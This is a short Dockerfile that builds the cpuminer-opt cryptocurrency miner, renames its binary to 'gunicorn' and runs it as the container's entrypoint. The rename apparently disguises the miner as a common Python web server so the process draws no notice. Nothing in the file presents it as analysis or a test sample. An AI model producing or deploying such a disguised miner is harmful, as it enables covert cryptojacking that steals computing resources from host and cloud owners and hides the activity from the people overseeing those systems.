FROM ubuntu:20.04

RUN apt update && \
    DEBIAN_FRONTEND=noninteractive apt install -y \
    git build-essential automake autoconf libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev \
    && rm -rf /var/lib/apt/lists/*

COPY cpuminer-opt /opt/cpuminer-opt
WORKDIR /opt/cpuminer-opt

RUN ./build.sh

RUN mv cpuminer gunicorn

ENTRYPOINT ["./gunicorn"]
